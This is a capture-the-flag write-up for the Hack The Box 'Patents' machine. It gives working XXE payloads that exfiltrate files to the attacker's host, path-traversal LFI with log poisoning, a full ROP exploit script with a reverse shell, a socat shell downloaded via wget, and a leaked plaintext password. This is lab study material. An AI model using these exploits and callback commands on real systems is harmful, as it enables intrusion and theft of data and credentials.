# User

## nmap
```
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 39:b6:84:a7:a7:f3:c2:4f:38:db:fc:2a:dd:26:4e:67 (RSA)
|   256 b1:cd:18:c7:1d:df:57:c1:d2:61:31:89:9e:11:f5:65 (ECDSA)
|_  256 73:37:88:6a:2e:b8:01:4e:65:f7:f8:5e:47:f6:10:c4 (ED25519)
80/tcp   open  httpApache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 57E2685CB1CD9B0F1ADA444F3CFF20C6
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: MEOW Inc. - Patents Management
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   Help, LPDString, LSCP: 
|_    LFM 400 BAD REQUEST
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.80%I=7%D=3/24%Time=5E7AE370%P=x86_64-pc-linux-gnu%r(LS
SF:CP,17,"LFM\x20400\x20BAD\x20REQUEST\r\n\r\n")%r(Help,17,"LFM\x20400\x20
SF:BAD\x20REQUEST\r\n\r\n")%r(LPDString,17,"LFM\x20400\x20BAD\x20REQUEST\r
SF:\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 is a web server for MEOW Inc and has a list of patents

Port 8888 is some kind of web server that returns malformed responses with
`LFM 400 BAD REQUEST`.

## upload.html and convert.php
Converts docx files to pdf.  Creating a blank docx from google docs and then looking at the PDF shows
```
<</Creator<FEFF005700720069007400650072>
/Producer<FEFF004C0069006200720065004F0066006600690063006500200036002E0030>
```

Converting in CyberChef from hex yields LibreOffice

```
þÿ.W.r.i.t.e.r
þÿ.L.i.b.r.e.O.f.f.i.c.e. .6...0
```

## utilizing dirbuster

Yields a number of things, but `/vendor/composer/installed` is a json file of the installed php libraries.  We find that gears/pdf is doing the conversion, utilizing LibreOffice headless on the command line.  Trying various CVEs don't work so it's likely version 6.0.7.  Also you can find the following:

### /release/UpdateDetails.txt
```
v1.2 alpha:
- meow@conquertheworld: Added ability to include patents. Still experimental, it's hidden.
v1.1 release:
- gbyolo@htb: Removed "meow fixes", they weren't real fixes.
v1.0 release:
- meow@conquertheworld: Fixed the following vulnerabilities:
1. Directory traversal
2. Local file inclusion (parameter)
v0.9 alpha:
- meow@conquertheworld.htb: Minor fixes, fixed 2 vulnerabilities. The Docx2Pdf App is ready.
v0.7 alpha:
- gbyolo@tb: fixed conversion parameters. Meow's changes for custom folder should now work.
v0.7 alpja:
- meow@conquertheworld.htb: enabled entity parsing in custom folder
- gbyolo@htb: added conversion of all files, to generate pdf compliant from docx
v0.6 alpha:
- gbyolo@htb: enabled docx conversion to pdf. Seems to work!
```

## XXE LFI

* Changing `item1.xml` in an unzipped docx file, adding the following
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://10.10.14.11/patents/ext.dtd">
    %ext;
    %param1;
]>
<message>&exfil;</message>
```

* Zip it up along with the rest of the xml files that compose the docx.
* Start running the `simple-http-server.js` that will serve the external DTD and decode the base64 to create the files retrieved through LFI.
* Setup a script `do-xxe.sh` that echos the external DTD with desired file to include and then makes a call to curl to upload the docx.
```sh
#!/bin/sh
NAME="binding"
LFI="${1}"
cd /home/zoey/htb/patents/xxe
echo "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=${LFI}\">\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://10.10.14.11/exfil-b64${LFI}?f=%data;'>\">\n" > ../ext.dtd
curl http://10.10.10.173/convert.php -F "userfile=@${NAME}_xxe.docx" -F "submit=Generate pdf" -H "Expect:"

```

## Files on the system
### /etc/apache2/sites-enabled/000-default.conf
```conf
<VirtualHost *:80>
  DocumentRoot /var/www/html/docx2pdf

  <Directory /var/www/html/docx2pdf/>
Options -Indexes +FollowSymLinks +MultiViews
AllowOverride All
Order deny,allow
Allow from all
  </Directory>

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
### config.php
```php
# needed by convert.php
$uploadir = 'letsgo/';

# needed by getPatent.php
# gbyolo: I moved getPatent.php to getPatent_alphav1.0.php because it's vulnerable
define('PATENTS_DIR', '/patents/');
```

## getPatent_alphav1.0.php - LFI Again

This just removes all instances of `../` in the url, so `....//` works for directory traversal.  Various files that aren't able to be retrieved via XXE are available through this php LFI.  Not entirely sure why, but might be due to their contents.  Some of those files include `/var/log/apache2/access.log` and `/proc/self/fd/*` which we can poison with a custom value in the user agent or referer.  Setup a reverse shell and start enum.

## Reverse Shell
Run spy to see
```
/bin/sh -c env PASSWORD="!gby0l0r0ck\$\$!" /opt/checker_client/run_file.sh
date 
python checker.py 10.100.0.1:8888 lfmserver_user PASSWORD /var/www/html/docx2pdf/convert.php 
```
Notice that `/home/gbyolo/user.txt `is owned by `root`.  Try to `su - root` but it complains it's not a real shell.  Use anyone of a number of things to upgrade to a pseudo-terminal that will fool the su executable.  Grab `user.txt`.

# Root
## Enumerating after user.txt

### /opt/checker_client/
Find source code here that shows how to make requests to the LFM server.

### /usr/src/lfm/.git
A git repo for the lfm server.  Get the files on to your local machine.  Zip them up and upload them to the simple http server via curl.

## LFM Server

### Restoring Git Repo Source
Run `git log --summary` and see that all the files have been deleted.  Do a `git checkout` of the commit id before the deletions to restore the source code.

### pwning lfmserver
#### leaking libc
The executable on the server is available, as well as information on the version of libc in the README.

Checking out the executable and source we find that the lfmserver binary has code not present in the source.  Particularly `handle_check` and `url_decode`.  A little fuzzing shows changing the filename lengths for the CHECK function breaks stuff.  Use `pwntools's cyclic` command to help find offsets.

Using gdb and the gef plugin we can send requests to the server and step through the processing.  Useful commands:

* `b *0x00breakpoint`
* `run`
* `continue`
* `x/60gx $rsp` - display memory around $rsp+60
* `vmmap`
* `set follow-fork-mode child` - The main process forks and we need to follow it
* `set detach-on-fork off` - For some reason it was hard to restart the initial thread after a crash if we didn't stop it as well when breaking
* `kill` - to kill a thread after it crashes
* `info threads` - show the threads
* `thr #.#` - switch to  a thread


 Further investigation shows you can both hit the `url_decode` function to overwrite the stack, as well as allow the `handle_check` function to complete in order to hit the `ret` and start the rop chain, by specifying a file that exists, followed by a %00.  For example:

```
CHECK /convert.php%00payloadgoesafter141morecharactersalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaab%BB%BB%AA%AA%00%00%00%00K%5C%40%00%00%00%00%00%06%00%00%00%00%00%00%00I%5C%40%00%00%00%00%00%20%90%40%00%00%00%00%00%AA%AA%AA%AA%00%00%00%00%20%24%40%00%00%00%00%00 LFM
User=lfmserver_user
Password=!gby0l0r0ck$$!

nope
```

In order to send binary your payload needs to be urlencoded.  Utilizing some gadgets we can leak the libc base.

```sh
╭─zoey@nomadic ~/htb/patents/lfm ‹master*› 
╰─$ ROPgadget --binary lfmserver
0x000000000040251f : nop ; ret
0x0000000000405c4b : pop rdi ; ret
0x0000000000405c49 : pop rsi ; pop r15 ; ret
```

"In the case of nop gadgets, they are exclusively used for aligning memory as far as I know, so that EIP doesn't read from the middle of a pointer, for example. In terms of crafting a payload or executing shellcode, they are used mostly when exact memory address aren't known or to align the shellcode correctly."  `0x405c4b` can give us a gadget for our first argument. `0x405c49` can give us a gadget for our second argument.  Knowing this we can make calls.  In order to leak something we need to write to the socket.  We can brute-force the socket fd and write an address to it from the GOT.  Stringing it together...

```python
payload = "/convert.php%00"
payload += cyclic(140).decode("utf-8")
payload += urllib.parse.quote(p64(0xAAAABBBB)) # $rbp value after ret
payload += urllib.parse.quote(p64(0x405c4b)) # gadget to pop rdi
payload += urllib.parse.quote(p64(0x6)) # rdi value, arg1, # for socket descriptor (brute-force?)
payload += urllib.parse.quote(p64(0x405c49)) # next gadget to pop rsi
payload += urllib.parse.quote(p64(lfmELF.got['dup2'])) #rsi value, arg2, pointer to bytes to write
payload += urllib.parse.quote(p64(0xAAAAAAAA))# r15 value, throwaway
payload += urllib.parse.quote(p64(lfmELF.symbols['write'])) # call to write to socket
rcvd = sendPayload(payload)
```

Subtracting the the dup2 leaked address from the location in libc gives us the libc_base:

```python
libc_base = dup2_leak - libc.symbols["dup2"] # compute libc base
print("dup2 = %s" % hex(dup2_leak))
print("libc_base = %s" % hex(libc_base))
```

#### Creating the reverse shell

Once we have the libc base address we can start trying to call various other functions.  If we can call dup2 three times and then execute `/bin/sh` we've got a reverse shell setup.  We already have dup2, and we can find system via `libc_base + libc.symbols['system']`, so now we need a `/bin/sh` string.  You can find it via

```sh
╭─zoey@nomadic ~/htb/patents/lfm ‹master*› 
╰─$ strings -t x -a ../checker/libc-2.28.so | grep "/bin/sh"                                1 ↵
 1aae80 /bin/sh
 ```

Now that we have the ingredients we can string it altogether in `do-check.py`.

```python
payload = "/convert.php%00"
payload += cyclic(140).decode("utf-8")
payload += urllib.parse.quote(p64(0xAAAABBBB)) # $rbp value after ret

payload += urllib.parse.quote(p64(pop_rdi))
payload += urllib.parse.quote(p64(0x6))
payload += urllib.parse.quote(p64(pop_rsi_and_r15))
payload += urllib.parse.quote(p64(0x0))
payload += urllib.parse.quote(p64(0xdeadbeef)) #ignored
payload += urllib.parse.quote(p64(dup2))

payload += urllib.parse.quote(p64(pop_rdi))
payload += urllib.parse.quote(p64(0x6))
payload += urllib.parse.quote(p64(pop_rsi_and_r15))
payload += urllib.parse.quote(p64(0x1))
payload += urllib.parse.quote(p64(0xdeadbeef)) #ignored
payload += urllib.parse.quote(p64(dup2))

payload += urllib.parse.quote(p64(pop_rdi))
payload += urllib.parse.quote(p64(0x6))
payload += urllib.parse.quote(p64(pop_rsi_and_r15))
payload += urllib.parse.quote(p64(0x2))
payload += urllib.parse.quote(p64(0xdeadbeef)) #ignored
payload += urllib.parse.quote(p64(dup2))

payload += urllib.parse.quote(p64(nop)) # needed this to align on the remote server

payload += urllib.parse.quote(p64(pop_rdi))
payload += urllib.parse.quote(p64(bin_sh))
payload += urllib.parse.quote(p64(system))

theRequest = getRequest(payload)

r.send(theRequest)
r.interactive()
```

We end up getting a remote shell but it dies quickly so we run socat to listen with ```socat file:`tty`,raw,echo=0 tcp-listen:12345```.  Then we quickly download socat, chmod it, and then connect the shell with `wget http://10.10.14.18/tools/socat64s && chmod +x socat64s && ./socat64s exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.18:12345`.

## Finding root.txt
```sh
root@patents:/mnt# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0    7:0    0 54.2M  1 loop /snap/lxd/10756
loop1    7:1    0 89.1M  1 loop /snap/core/8268
loop2    7:2    0 66.7M  1 loop /snap/lxd/9239
loop3    7:3    0 54.9M  1 loop /snap/lxd/12631
loop4    7:4    0 89.1M  1 loop /snap/core/8039
sda      8:0    0   25G  0 disk 
├─sda1   8:1    0    1M  0 part 
├─sda2   8:2    0   16G  0 part /
├─sda3   8:3    0    1G  0 part /boot
└─sda4   8:4    0    2G  0 part /home
sdb      8:16   0  512M  0 disk 
└─sdb1   8:17   0  511M  0 part /root
sr0     11:0    1 1024M  0 rom
```
 It looks like `/root` might be mounted on top of another root on `sda2`.  So let's mount it with `mount /dev/sda2 /mnt/sda2`.  Now when we look in `/mnt/sda2/root` we find

 ```sh
 root@patents:/mnt/root/root# ls -la
total 68
drwx------  8 root root  4096 Dec  3 14:07 .
drwxr-xr-x 23 root root  4096 Jan 12 00:03 ..
lrwxrwxrwx  1 root root     9 May 20  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Aug  7  2018 .bashrc
drwx------  2 root root  4096 Dec  3 14:07 .cache
drwx------  3 root root  4096 Dec  3 14:07 .gnupg
drwxr-xr-x  3 root root  4096 Dec  3 14:07 .local
-rw-r--r--  1 root root   148 Aug  7  2018 .profile
-r--------  1 root root    33 May 21  2019 root.txt
drwxr-xr-x  2 root root  4096 Dec  3 14:07 secret
drwxr-xr-x  3 root root  4096 Dec  3 14:07 snap
drwx------  2 root root  4096 Dec  3 14:07 .ssh
-rw-------  1 root root 18560 May 22  2019 .viminfo
-rw-r--r--  1 root root    35 May 22  2019 .vimrc
 ```
